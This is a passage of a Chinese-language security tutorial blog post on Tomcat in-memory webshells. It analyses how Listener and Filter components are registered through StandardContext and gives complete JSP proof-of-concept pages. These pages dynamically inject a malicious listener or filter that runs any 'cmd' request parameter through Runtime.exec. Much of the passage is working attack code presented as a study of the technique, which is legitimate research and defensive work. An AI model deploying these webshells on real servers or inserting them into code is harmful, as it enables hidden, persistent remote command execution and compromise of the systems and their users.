class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><strong>这是另一种获取<code>StandardContext</code>的方法</strong></p><p>接下来我们就可以来构造<code>poc</code>了</p><p><strong>先编写一个恶意的<code>Listener</code></strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>然后添加监听器</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="type">Shell_Listener</span> <span class="variable">shell_Listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Listener</span>();</span><br><span class="line">    context.addApplicationEventListener(shell_Listener);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>这里的<code>context</code>是上面获取的<code>StandardContext</code></p><h4 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h4><ul><li>获取<code>StandardContext</code>上下文</li><li>实现一个恶意<code>Listener</code></li><li>通过<code>StandardContext#addApplicationEventListener</code>方法添加恶意<code>Listener</code></li></ul><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">           <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">           <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   Runtime.getRuntime().exec(cmd);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                   n.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Shell_Listener</span> <span class="variable">shell_Listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Listener</span>();</span><br><span class="line">    context.addApplicationEventListener(shell_Listener);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>将上面的代码连起来解释就是</p><p><img src="../images/image-20230801103848317.png" alt="image-20230801103848317"></p><p>这里是先获取这个到这个<code>StandardContext</code> 这个类   然后通过这个类里的<code>addApplicationEventListener</code>来添加我们的恶意<code>Listener</code></p><p>然后添加成功后，这个<code>servlet</code>的<code>Listener</code>就会处理我们的http请求  然后如果传进来<code>cmd</code>的恶意参数的话就会执行</p><p>然后访问<code>Listener.jsp</code>将恶意<code>Listener</code>写入服务器</p><p><img src="../images/image-20230801104434368.png" alt="image-20230801104434368"></p><p><strong>然后直接执行就行了</strong></p><p><img src="../images/image-20230801104455200.png" alt="image-20230801104455200"></p><h3 id="Filter型"><a href="#Filter型" class="headerlink" title="Filter型"></a>Filter型</h3><p>这里解释一下这个<code>Filter</code>是个什么东西</p><p><strong>它在java中是起到一个过滤器的作用，就是无论用户访问哪个具体的路径，都会被该过滤器所拦截和处理，然后它将对所有进入应用程序的请求起作用。它可以执行一些预处理或后处理操作，并决定是否继续传递请求给下一个组件（如Servlet）</strong></p><p>(这就是为什么可以当内存马的原因了 因为自身也可以对http请求进行预处理)</p><p>仿照Listener型内存马的实现思路，我们同样能实现Filter型内存马。我们知道，在Servlet容器中，Filter的调用是通过<code>FilterChain</code>实现的</p><p><strong>和<code>Listener</code>一样   最后都是会调用某一个特定的方法</strong></p><p>这里是调用这个<code>doFilter()</code> 方法</p><p><img src="../images/image.png" alt="img"></p><p>先来实现一个恶意的<code>Filter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Filter;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebFilter(&quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Filter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                n.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的话我们在这个<code>doFilter</code>处打上断点   </p><p><img src="../images/image-20230801113428574.png" alt="image-20230801113428574"></p><p>得到调用栈</p><p>跟进<code>ApplicationFilterChain#internalDoFilter</code></p><p><img src="../images/image-20230801113542381.png" alt="image-20230801113542381"></p><p>调用了<code>filter.doFilter()</code>，而<code>filter</code>是通过<code>filterConfig.getFilter()</code>得到的，<code>filterConfig</code>定义如下</p><p><img src="../images/image-20230801115805488.png" alt="image-20230801115805488"></p><p>我们知道，一个filterConfig对应一个Filter，用于存储Filter的上下文信息。这里的<em><code>filters</code></em>属性是一个ApplicationFilterConfig数组。我们来寻找一下<em><code>ApplicationFilterChain.filters</code></em>属性在哪里被赋值。</p><p><strong>这里的话看调用栈就能找到了</strong></p><p>在<code>StandardWrapperValve#invoke</code>这个方法里面</p><p><img src="../images/image-20230801142627056.png" alt="image-20230801142627056"></p><p>跟进这个<em><code>ApplicationFilterFactory#createFilterChain</code></em>函数</p><p><img src="../images/image-20230801142917799.png" alt="image-20230801142917799"></p><p>通过这个函数  我们可以清晰的来分析这个<code>filterChain</code>的创建过程</p><ol><li>首先通过<code>filterChain = new ApplicationFilterChain()</code>创建一个空的filterChain对象</li><li>然后通过<code>wrapper.getParent()</code>函数来获取<code>StandardContext</code>对象</li><li>接着获取<code>StandardContext</code>中的<code>FilterMaps</code>对象，<code>FilterMaps</code>对象中存储的是各Filter的名称路径等信息</li><li>最后根据Filter的名称，在<code>StandardContext</code>中获取<code>FilterConfig</code></li><li>通过<code>filterChain.addFilter(filterConfig)</code>将一个<code>filterConfig</code>添加到<code>filterChain</code>中</li></ol><p>跟进这个<code>ApplicationFilterChain#addFilter</code>方法</p><p><img src="../images/image-20230801143332841.png" alt="image-20230801143332841"></p><p>这里就可以看到<code>filters</code>被赋值的过程</p><p><img src="../images/image-20230801143540902.png" alt="image-20230801143540902"></p><p>这样的话我们就可以控制调用谁的<code>doFilter()</code>方法了</p><p>所以关键就是将恶意Filter的信息添加进<code>FilterConfig</code>数组中，这样Tomcat在启动时就会自动初始化我们的恶意Filter。</p><h4 id="FilterConfig、FilterDef和FilterMaps"><a href="#FilterConfig、FilterDef和FilterMaps" class="headerlink" title="FilterConfig、FilterDef和FilterMaps"></a>FilterConfig、FilterDef和FilterMaps</h4><p>虽然<code>filterConfig</code>的赋值方法找到了  但是通过赋值的过程中  还是会用到</p><p><code>FilterDef</code>和<code>FilterMaps</code>的</p><p>跟进到createFilterChain函数中，我们能看到此时的上下文对象<code>StandardContext</code>实际上是包含了这三者的</p><p><img src="../images/image-20230801144512577.png" alt="image-20230801144512577"></p><h5 id="filterConfigs"><a href="#filterConfigs" class="headerlink" title="filterConfigs"></a>filterConfigs</h5><p>其中filterConfigs包含了当前的上下文信息<code>StandardContext</code>、以及<code>filterDef</code>等信息</p><p><img src="../images/image-20230801145049895.png" alt="image-20230801145049895"></p><p>其中<code>filterDef</code>存放了filter的定义，包括filterClass、filterName等信息。对应的其实就是web.xml中的<code>&lt;filter&gt;</code>标签。</p><p><img src="../images/image-20230801145337682.png" alt="image-20230801145337682">    </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span><span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span><span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，filterDef必要的属性为<code>filter</code>、<code>filterClass</code>以及<code>filterName</code>。</p><h5 id="filterDefs"><a href="#filterDefs" class="headerlink" title="filterDefs"></a>filterDefs</h5><p><img src="../images/image-20230801145617679.png" alt="image-20230801145617679"></p><p><code>filterDefs</code>是一个<code>HashMap</code>，以键值对的形式存储<code>filterDef</code></p><h5 id="filterMaps"><a href="#filterMaps" class="headerlink" title="filterMaps"></a>filterMaps</h5><p><code>filterMaps</code>中以array的形式存放各filter的路径映射信息，其对应的是web.xml中的<code>&lt;filter-mapping&gt;</code>标签</p><p><img src="../images/image-20230801145757771.png" alt="image-20230801145757771"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span><span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span><span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>filterMaps必要的属性为<code>dispatcherMapping</code>、<code>filterName</code>、<code>urlPatterns</code></p><p>于是下面的工作就是构造含有恶意filter的FilterMaps和FilterConfig对象，并将FilterConfig添加到filter链中了。</p><h4 id="动态注册Filter"><a href="#动态注册Filter" class="headerlink" title="动态注册Filter"></a>动态注册Filter</h4><p>经过上面的分析，我们可以总结出动态添加恶意Filter的思路</p><ol><li>获取StandardContext对象</li></ol><p><strong>(因为要构造那三种<code>filter</code>  都需要<code>StandardContext</code>    <code>StandardContext</code>包含了那三种<code>filter</code>)</strong></p><ol><li>创建恶意Filter</li></ol><p><strong>因为最后是要控制filter的值为我们构造的恶意Filter类</strong></p><p><img src="../images/image-20230801151809859.png" alt="image-20230801151809859"></p><ol><li>使用FilterDef对Filter进行封装，并添加必要的属性</li></ol><p><img src="../images/image-20230801152009396.png" alt="image-20230801152009396"></p><p>因为<code>value</code>是<code>FilterDef</code>的    然后还得添加下面的属性</p><ol><li>创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</li></ol><p><img src="../images/image-20230801152156916.png" alt="image-20230801152156916"></p><p><strong>这里就是上面新建<code>FilterMap</code>的原因  还有传name和path的原因</strong></p><ol><li>使用<code>ApplicationFilterConfig</code>封装<code>filterDef</code>，然后将其添加到<code>filterConfigs</code>中</li></ol><p><img src="../images/image-20230801152404617.png" alt="image-20230801152404617"></p><p><strong>其实上面的这五个步骤得来的原因都可以追述到前面写的记录   都是先进行逐步分析  然后才得出最终步骤的</strong></p><h5 id="第一步————-获取StandardContext对象"><a href="#第一步————-获取StandardContext对象" class="headerlink" title="第一步————-获取StandardContext对象"></a>第一步————-获取StandardContext对象</h5><p>StandardContext对象主要用来管理Web应用的一些全局资源，如Session、Cookie、Servlet等。因此我们有很多方法来获取StandardContext对象。</p><p>Tomcat在启动时会为每个Context都创建个ServletContext对象，来表示一个Context，从而可以将ServletContext转化为StandardContext。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取ApplicationContextFacade类</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//反射获取ApplicationContextFacade类属性context为ApplicationContext类</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//反射获取ApplicationContext类属性context为StandardContext类</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230801152744222.png" alt="image-20230801152744222"></p><p>上述的代码就是根据这一块来写的   从启动时<code>tomcat</code>自动创建的<code>ServletContext</code>开始   然后一步一步引导到<code>StandardContext</code></p><h5 id="第二步—————创建恶意Filter"><a href="#第二步—————创建恶意Filter" class="headerlink" title="第二步—————创建恶意Filter"></a>第二步—————创建恶意Filter</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Filter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        String cmd=request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">            n.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="第三步———————使用FilterDef封装filter"><a href="#第三步———————使用FilterDef封装filter" class="headerlink" title="第三步———————使用FilterDef封装filter"></a>第三步———————使用FilterDef封装filter</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//filter名称</span></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;CommonFilter&quot;</span>;</span><br><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilter(filter);</span><br><span class="line">filterDef.setFilterName(name);</span><br><span class="line">filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br></pre></td></tr></table></figure><h5 id="第四步————————创建filterMap"><a href="#第四步————————创建filterMap" class="headerlink" title="第四步————————创建filterMap"></a>第四步————————创建filterMap</h5><p>filterMap用于filter和路径的绑定</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">filterMap.setFilterName(name);</span><br><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">standardContext.addFilterMapBefore(filterMap);</span><br></pre></td></tr></table></figure><h5 id="第五步—————-封装filterConfig及filterDef到filterConfigs"><a href="#第五步—————-封装filterConfig及filterDef到filterConfigs" class="headerlink" title="第五步—————-封装filterConfig及filterDef到filterConfigs"></a>第五步—————-封装filterConfig及filterDef到filterConfigs</h5><p>封装filterConfig及filterDef到filterConfigs</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line">    </span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line">filterConfigs.put(name, filterConfig);</span><br></pre></td></tr></table></figure><h5 id="完整POC-1"><a href="#完整POC-1" class="headerlink" title="完整POC"></a>完整POC</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%! <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Filter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Shell_Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Filter</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;CommonFilter&quot;</span>;</span><br><span class="line">    <span 